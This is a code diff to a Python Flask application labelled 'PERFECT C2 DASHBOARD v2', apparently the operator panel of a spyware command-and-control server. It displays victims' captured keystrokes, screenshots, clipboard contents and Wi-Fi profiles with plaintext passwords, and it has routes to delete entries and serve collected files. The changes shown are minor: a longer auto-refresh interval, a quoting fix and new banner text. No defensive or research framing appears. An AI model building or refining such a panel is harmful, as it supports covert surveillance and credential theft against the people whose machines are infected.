@@ -74,7 +74,6 @@ def perfect_log():
         print(f"❌ {e}")
         return jsonify({'error': str(e)}), 500
 
-# FIXED DELETE + CLEAR
 @app.route('/delete/<category>/<index>')
 def delete_item(category, index):
     try:
@@ -130,7 +129,7 @@ def perfect_dashboard():
         <div class="capture" id="wifi-{len(live_data['wifi'])-5+i}">
             <span class="ip">{c['ip']}</span> <span class="ts">{c['ts']}</span>
             <div class="wifi-profiles">
-                {"".join([f'<div>{p["ssid"]}: <strong>{p["password"]}</strong></div>' for p in c["data"].get("wifi_profiles", [])])}
+                {''.join([f'<div>{p["ssid"]}: <strong>{p["password"]}</strong></div>' for p in c["data"].get("wifi_profiles", [])])}
             </div>
             <button onclick="deleteItem('wifi', {len(live_data['wifi'])-5+i})" style="background:#ff4444;color:white;border:none;padding:4px 8px;border-radius:3px;">🗑️</button>
         </div>
@@ -152,7 +151,7 @@ def perfect_dashboard():
 <html>
 <head>
     <title>🔥 PERFECT C2 DASHBOARD v2</title>
-    <meta http-equiv="refresh" content="5">
+    <meta http-equiv="refresh" content="60">  <!-- ✅ 1 MINUTE AUTO-REFRESH -->
     <script>
         function deleteItem(category, index) {{
             fetch(`/delete/${{category}}/${{index}}`)
@@ -183,7 +182,7 @@ def perfect_dashboard():
 </head>
 <body>
     <div class="header">
-        <h1>🔥 PERFECT C2 v2 - ALL FIXED</h1>
+        <h1>🔥 PERFECT C2 v2 - 60s REFRESH</h1>
         <div class="stats">
             <div class="stat"><div class="stat-num">{len(live_data['keystrokes'])}</div>⌨️ Keystrokes</div>
             <div class="stat"><div class="stat-num">{len(live_data['screenshots'])}</div>📸 Screenshots</div>
@@ -226,5 +225,6 @@ def serve_file(filename):
     return send_from_directory(DATA_DIR, filename)
 
 if __name__ == '__main__':
-    print("🚀 PERFECT C2 v2 - WIFI/CLIPBOARD/CLEAR FIXED!")
+    print("🚀 PERFECT C2 v2 - 60s REFRESH + ALL FEATURES!")
+    print("🌐 http://localhost:5000")
     app.run(host='0.0.0.0', port=5000, debug=False)
